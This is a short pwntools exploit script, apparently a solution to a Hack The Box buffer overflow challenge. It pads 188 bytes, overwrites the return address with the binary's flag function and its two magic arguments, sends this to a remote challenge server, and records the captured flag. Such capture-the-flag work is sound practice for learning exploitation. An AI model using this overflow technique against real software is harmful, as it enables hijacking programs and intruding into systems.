from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x080492b0
continue
'''.format(**locals())

exe = './challenge/vuln'
elf = context.binary = ELF(exe, checksec=False)
# p = start()

p = remote("206.189.118.55", 32409)

payload = flat(
    cyclic(188),
    elf.sym.flag,
    0,
    0xdeadbeef,
    0xc0ded00d
)


p.sendlineafter(b': \n', payload)
p.interactive()

# Flag: HTB{0ur_Buff3r_1s_not_healthy}
